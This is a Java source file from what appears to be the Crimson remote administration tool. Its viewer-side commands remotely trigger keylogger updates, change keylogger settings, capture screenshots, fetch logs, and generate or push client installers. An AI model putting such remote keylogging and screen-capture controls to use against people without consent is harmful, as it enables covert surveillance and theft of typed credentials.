/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.viewer.net;

import static com.subterranean_security.crimson.universal.Flags.DEV_MODE;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.core.net.MessageFuture.MessageTimeout;
import com.subterranean_security.crimson.core.net.TimeoutConstants;
import com.subterranean_security.crimson.core.store.LcvidStore;
import com.subterranean_security.crimson.core.store.NetworkStore;
import com.subterranean_security.crimson.core.store.ProfileStore;
import com.subterranean_security.crimson.core.util.FileUtil;
import com.subterranean_security.crimson.core.util.IDGen;
import com.subterranean_security.crimson.proto.core.Generator.ClientConfig;
import com.subterranean_security.crimson.proto.core.Generator.GenReport;
import com.subterranean_security.crimson.proto.core.Misc.AuthMethod;
import com.subterranean_security.crimson.proto.core.Misc.Outcome;
import com.subterranean_security.crimson.proto.core.net.sequences.Chat.RQ_Chat;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RQ_CreateAuthGroup;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RQ_RemoveAuthGroup;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientControl.RQ_ChangeSetting;
import com.subterranean_security.crimson.proto.core.net.sequences.Generator.RQ_Generate;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.RQ_KeyUpdate;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogFile;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogType;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.RQ_Logs;
import com.subterranean_security.crimson.proto.core.net.sequences.MSG.Message;
import com.subterranean_security.crimson.proto.core.net.sequences.Screenshot.RQ_QuickScreenshot;
import com.subterranean_security.crimson.proto.core.net.sequences.State.RQ_ChangeClientState;
import com.subterranean_security.crimson.proto.core.net.sequences.State.RQ_ChangeServerState;
import com.subterranean_security.crimson.proto.core.net.sequences.State.StateType;
import com.subterranean_security.crimson.proto.core.net.sequences.Update.RQ_GetClientConfig;
import com.subterranean_security.crimson.universal.Universal;
import com.subterranean_security.crimson.viewer.ui.screen.generator.Report;
import com.subterranean_security.crimson.viewer.ui.screen.main.MainFrame;

public final class ViewerCommands {
	private static final Logger log = LoggerFactory.getLogger(ViewerCommands.class);

	private ViewerCommands() {
	}

	public static Outcome changeServerState(StateType st) {
		log.debug("Changing server state: {}", st.toString());
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRqChangeServerState(
					RQ_ChangeServerState.newBuilder().setNewState(st)), TimeoutConstants.DEFAULT);
			if (m == null) {
				outcome.setResult(false).setComment("Request timeout");
			} else if (!m.getRsOutcome().getResult()) {

				outcome.setResult(false).setComment(
						!m.getRsOutcome().getComment().isEmpty() ? m.getRsOutcome().getComment() : "no comment");

			} else {
				outcome.setResult(true);
			}
		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		} catch (MessageTimeout e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return outcome.build();
	}

	public static Outcome changeClientState(int cid, StateType st) {
		log.debug("Changing client state: {}", st.toString());
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid)
					.setRqChangeClientState(RQ_ChangeClientState.newBuilder().setNewState(st)),
					TimeoutConstants.DEFAULT);
			if (m == null) {
				outcome.setResult(false).setComment("Request timeout");
			} else {
				return m.getRsOutcome();
			}
		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		} catch (MessageTimeout e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return outcome.build();
	}

	public static Outcome createAuthMethod(AuthMethod at) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg())
					.setRqCreateAuthGroup(RQ_CreateAuthGroup.newBuilder().setAuthMethod(at)), TimeoutConstants.DEFAULT);
			if (m == null) {
				outcome.setResult(false).setComment("Request timeout");
			} else if (!m.getRsOutcome().getResult()) {
				outcome.setResult(false).setComment(
						!m.getRsOutcome().getComment().isEmpty() ? m.getRsOutcome().getComment() : "no comment");

			} else {
				outcome.setResult(true);
			}
		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		} catch (MessageTimeout e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return outcome.build();
	}

	public static Outcome removeAuthMethod(int id) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = NetworkStore.route(
					Message.newBuilder().setRqRemoveAuthGroup(RQ_RemoveAuthGroup.newBuilder().setId(id)),
					TimeoutConstants.DEFAULT);
			if (m == null) {
				outcome.setResult(false).setComment("Request timeout");
			}

			return m.getRsOutcome();
		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		} catch (MessageTimeout e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		return outcome.build();
	}

	public static void generate(ClientConfig config, String output, Date creation) {
		int id = IDGen.msg();
		RQ_Generate.Builder rq = RQ_Generate.newBuilder().setInternalConfig(config);

		NetworkStore.route(Message.newBuilder().setId(id).setRqGenerate(rq).build());

		try {
			Message rs = NetworkStore.getResponse(0, id, TimeoutConstants.RQ_Generate);

			// success
			final GenReport gr = rs.getRsGenerate().getReport();
			Runnable r = new Runnable() {
				public void run() {
					Report rep = new Report(gr);
					rep.setVisible(true);

				}
			};

			if (gr.getResult()) {
				MainFrame.main.np.addNote("info", "Generation complete!", "Click for report", r);
				FileUtil.writeFile(rs.getRsGenerate().getInstaller().toByteArray(), new File(output));
			} else {
				MainFrame.main.np.addNote("error", "Generation failed!", "Click for report", r);
				log.error("Could not generate an installer");
			}

		} catch (InterruptedException e) {
			log.debug("Generation interrupted");
		} catch (IOException e) {
			log.error("Failed to write the installer");
			e.printStackTrace();
		} catch (MessageTimeout e) {
			MainFrame.main.np.addNote("error", "Generation Timed Out!");
			log.error("Could not generate an installer. Check the network.");
		}

	}

	public static void trigger_key_update(int cid, Date target) {
		log.debug("Triggering keylog update");
		try {
			Message m = NetworkStore.route(
					Message.newBuilder().setId(IDGen.msg()).setRqKeyUpdate(
							RQ_KeyUpdate.newBuilder().setCid(cid).setStartDate(target == null ? 0 : target.getTime())),
					TimeoutConstants.RQ_KeyUpdate);
			if (m != null) {
				log.debug("Update result: " + m.getRsKeyUpdate().getResult());
			}

		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (MessageTimeout e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static ClientConfig getClientConfig(int cid) {
		log.debug("Retrieving client config");
		try {
			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid)
					.setRqGetClientConfig(RQ_GetClientConfig.newBuilder()), TimeoutConstants.DEFAULT);
			if (m != null) {
				return m.getRsGetClientConfig().getConfig();
			}

		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (MessageTimeout e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

	public static Outcome updateClient(int cid) {
		Outcome.Builder outcome = Outcome.newBuilder();
		ClientConfig client = getClientConfig(cid);
		if (client == null) {
			outcome.setResult(false).setComment("Could not obtain client configuration");
		} else if (client.getBuildNumber() >= Universal.build && !DEV_MODE) {
			outcome.setResult(false).setComment("No updated needed");
		} else {
			try {
				Message m = NetworkStore.route(
						Message.newBuilder().setId(IDGen.msg())
								.setRqGenerate(RQ_Generate.newBuilder().setSendToCid(cid).setInternalConfig(client)),
						TimeoutConstants.RQ_Generate);
				if (m == null) {
					outcome.setResult(false).setComment("No response");
				} else {
					GenReport gr = m.getRsGenerate().getReport();
					outcome.setResult(gr.getResult());
					if (!gr.getComment().isEmpty()) {
						outcome.setComment(gr.getComment());
					}
				}
			} catch (InterruptedException e) {
				outcome.setResult(false).setComment("Interrupted");
			} catch (MessageTimeout e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

		return outcome.build();
	}

	private static SimpleDateFormat screenshotDate = new SimpleDateFormat("YYYY-MM-dd hh.mm.ss");

	public static Outcome quickScreenshot(int cid) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid)
					.setRqQuickScreenshot(RQ_QuickScreenshot.newBuilder()), TimeoutConstants.DEFAULT);
			File file = new File(
					System.getProperty("user.home") + "/Crimson/" + screenshotDate.format(new Date()) + ".jpg");
			file.getParentFile().mkdirs();
			if (m != null) {
				outcome.setComment(file.getAbsolutePath());
				FileUtil.writeFile(m.getRsQuickScreenshot().getBin().toByteArray(), file);
				outcome.setResult(file.exists());

			} else {
				outcome.setResult(false).setComment("Request timeout");
			}

		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Error: Interrupted");
		} catch (IOException e) {
			outcome.setResult(false).setComment("Error: " + e.getMessage());
		} catch (MessageTimeout e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return outcome.build();
	}

	public static LogFile getLog(int cid, LogType type) {
		try {
			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid)
					.setRqLogs(RQ_Logs.newBuilder().setLog(type)), TimeoutConstants.DEFAULT);

			if (m != null) {
				return m.getRsLogs().getLog(0);

			}

		} catch (InterruptedException e) {
		} catch (MessageTimeout e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

	public static List<LogFile> getLogs(int cid) {
		try {
			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid)
					.setRqLogs(RQ_Logs.newBuilder()), TimeoutConstants.DEFAULT);

			if (m != null) {
				return m.getRsLogs().getLogList();

			}

		} catch (InterruptedException e) {
		} catch (MessageTimeout e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

	public static Outcome changeSetting(int cid, RQ_ChangeSetting rq) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = NetworkStore.route(
					Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid).setRqChangeSetting(rq),
					TimeoutConstants.DEFAULT);

			if (m == null) {
				outcome.setResult(false).setComment("Request timed out");
			} else {
				if (m.getRsOutcome().getResult()) {
					// update profile
					if (rq.hasKeyloggerState()) {
						ProfileStore.getClient(cid).setKeyloggerState(rq.getKeyloggerState());
					}
					if (rq.hasFlushMethod()) {
						ProfileStore.getClient(cid).setKeyloggerTrigger(rq.getFlushMethod());
					}
					if (rq.hasFlushValue()) {
						ProfileStore.getClient(cid).setKeyloggerTriggerValue(rq.getFlushValue());
					}
				}
				return m.getRsOutcome();
			}

		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		} catch (MessageTimeout e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return outcome.build();
	}

	public static Outcome openChat(int cid, boolean prompt) {
		Outcome.Builder outcome = Outcome.newBuilder();
		try {
			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setTo(cid).setFrom(LcvidStore.cvid)
					.setRqChat(RQ_Chat.newBuilder()), TimeoutConstants.DEFAULT);

			if (m == null) {
				outcome.setResult(false).setComment("Request timed out");
			} else {
				// TODO open chat
				outcome.setResult(true);
			}

		} catch (InterruptedException e) {
			outcome.setResult(false).setComment("Interrupted");
		} catch (MessageTimeout e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return outcome.build();
	}

}
